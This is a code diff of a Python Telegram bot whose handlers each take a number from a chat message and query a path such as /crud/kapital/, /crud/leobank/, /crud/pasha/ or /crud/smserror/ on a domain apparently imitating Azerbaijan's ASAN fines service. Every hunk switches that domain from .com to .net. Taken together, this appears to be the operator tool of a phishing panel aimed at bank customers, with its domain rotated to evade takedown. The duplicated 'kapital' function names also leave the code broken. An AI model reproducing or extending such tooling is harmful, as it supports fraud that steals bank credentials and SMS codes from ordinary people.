@@ -17,7 +17,7 @@ app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.com/crud/kapital/{number}/"
+        url = f"https://asan-cerime.net/crud/kapital/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -33,7 +33,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.com/crud/abb/{number}/"
+        url = f"https://asan-cerime.net/crud/abb/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -49,7 +49,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.com/crud/smserror/{number}/"
+        url = f"https://asan-cerime.net/crud/smserror/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -65,7 +65,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.com/crud/smsfix/{number}/"
+        url = f"https://asan-cerime.net/crud/smsfix/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -80,7 +80,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.com/crud/leobank/{number}/"
+        url = f"https://asan-cerime.net/crud/leobank/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -95,7 +95,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.com/crud/unibank/{number}/"
+        url = f"https://asan-cerime.net/crud/unibank/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -111,7 +111,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.com/crud/leobank/{number}/"
+        url = f"https://asan-cerime.net/crud/leobank/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -127,7 +127,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.com/crud/pasha/{number}/"
+        url = f"https://asan-cerime.net/crud/pasha/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
